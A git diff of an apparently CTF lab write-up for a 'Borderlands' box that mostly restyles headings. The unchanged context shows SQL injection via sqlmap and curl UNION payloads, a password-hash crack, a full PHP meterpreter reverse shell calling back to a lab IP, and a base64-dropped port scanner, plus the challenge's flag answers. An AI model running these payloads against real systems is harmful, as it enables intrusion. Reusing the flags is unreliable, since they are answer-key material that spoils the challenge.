@@ -18,7 +18,11 @@ Access it <a href=""</a>here.<br>
 - [Nmap](#1)<br>
 - [API Key "AND*"](#2)<br>
 - [API Key "WEB*"](#3)<br>
-- [API Key "GIT*"](#4)<br></p>
+- [API Key "GIT*"](#4)<br>
+- [/var/www within web app host](#5)<br>
+- [/root/ within Router1](#6)<br>
+- [Transmission from server to client over UDP](#7)<br>
+- [Transmission from server to client over TCP](#8)<br</p>
     
 <br>
 
@@ -419,12 +423,12 @@ if ($docDetails !== null)
 ?>
 ```
 
+<h2 align="center">/var/www within web app host<a id='5'></a></h2>
 <br>
-
 <p> 1.4. What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX} <em> Hint : /var/www/flag.txt</em><br>
 <code>{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}</code></p>
 
-<p>Navigated to the path below, intercepted it with Burp Suite and saved the request to <code>req</code>.</p>
+<p align="center">Navigated to the path below, intercepted it with Burp Suite and saved the request to <code>req</code>.</p>
 
 ```bash
 http://Target_IP/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
@@ -437,10 +441,7 @@ http://Target_IP/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
 <img width="908" height="187" alt="image" src="https://github.com/user-attachments/assets/d50c873d-126b-4f7c-93f0-05f478c4656c" />
 
 <br>
-
-
-<h3>sqlmap</h3>
-
+<h3 align="center">sqlmap</h3>
 
 ```bash
 :~/Borderlands# sqlmap -r request.txt --risk=3 --level=3 --dump --batch
@@ -497,11 +498,9 @@ Table: documents
 ```
 
 
-<p><code>billg</code>code> : <code>$2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW</code></p>
+<p align="center"><code>billg</code>code> : <code>$2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW</code></p>
 
-<br>
-
-<h3>John The Ripper</h3>
+<h3 align="center">John The Ripper</h3>
 
 ```bash
 :~/Borderlands# john hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -523,8 +522,7 @@ Session completed.
 
 
 <br>
-
-<h3>Testing the suggested payloads to practice</h3>
+<h3 align="center">Testing the suggested payloads to practice</h3>
 
 ```bash
 :~/Borderlands# curl -s 'http://10.10.143.3/api.php? apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278'
@@ -552,8 +550,6 @@ Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document L
 :~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -'
 Document ID: qxbkqXzWECvmnUcosAfIYfPrXjgLwTlDoAYsCHCowjAmHqqbqq<br />Document Name: <br />Document Location: <br />
 ```
-
-<br>
 
 ```bash
 :~/Borderlands# sqlmap -r request.txt -D myfirstwebsite --os-shell
@@ -607,21 +603,29 @@ command standard output: '{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}'
 os-shell> 
 ```
 
+<h2 align="center">/root/ within Router1<a id='6'></a></h2>
+<br>
+<p> 1.5. What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}<em> Hint : use python to portscan</em><br>
+<code>{FLAG:Router1:c877f00ce2b886446395150589166dcd}</code></p>
 <br>
 
-<p> 1.5. What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX} <em> Hint : use python to portscan</em><br>
-<code>{FLAG:Router1:c877f00ce2b886446395150589166dcd}</code></p>
+<h2 align="center">Transmission from server to client over UDP<a id='7'></a></h2>
+<br>
+<p> 1.6. What flag is transmitted from flag_server to flag_client over UDP? {FLAG:UDP:XXX}em> Hint : use python to portscan</em><br>
+<code>{FLAG:UDP:3bb271d020df6cbe599a46d20e9fcb3c}</code></p>
+<br>
 
-
+<h2 align="center">Transmission from server to client over UDP<a id='8'></a></h2>
+<br>
+<p> 1.7. What flag is transmitted from flag_server to flag_client over TCP? {FLAG:TCP:XXX}em> Hint : use python to portscan</em><br>
+<code>{FLAG:TCP:__________________________}</code></p>
 <br>
 
 <img width="1129" height="140" alt="image" src="https://github.com/user-attachments/assets/e28caee7-df5a-4072-9f02-259d27a0ac47" />
 
 
 
-<h3>msfvenom</h3>
-
-
+<h3 align="center">msfvenom</h3>
 
 ```bash
 :~/Borderlands# msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.195.74 lport=4444 -f raw
@@ -632,7 +636,7 @@ Payload size: 1113 bytes
 /*<?php /**/ error_reporting(0); $ip = '10.10.195.74'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-<p><em>shell.php</em></p>
+<p align="center"><em>shell.php</em></p>
 
 ```bash
 <?php /**/ error_reporting(0); $ip = '10.10.195.74'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
@@ -645,8 +649,6 @@ Payload size: 1113 bytes
 ```bash
 http://TargetIP/shell.php
 ```
-
-
 
 ```bash
 msf6 >  use multi/handler
@@ -692,7 +694,7 @@ ip -s neigh
 ```
 
 
-<p><em>arp.py</em></p>
+<p align="center"><em>arp.py</em></p>
 
 ```bash
 echo 'aW1wb3J0IHNvY2tldAoKZm9yIGkgaW4gcmFuZ2UoMCwgMjU2KToKICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzb2NrLnNldHRpbWVvdXQoMC41KQogICAgaXAgPSAnMTcyLjE2LjEue30nLmZvcm1hdChpKQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOgogICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgIHByaW50KGlwICsgJyAgIE9OJyAsIGZsdXNoPVRydWUpCiAgICBlbHNlOgogICAgICAgIHByaW50KGlwLCAgZmx1c2g9VHJ1ZSkK' | base64 -d > arp.py
@@ -759,7 +761,6 @@ Port 2601:      Open
 ...
 Port 2605:      Open
 ...
-
 ```
 
 ```bash
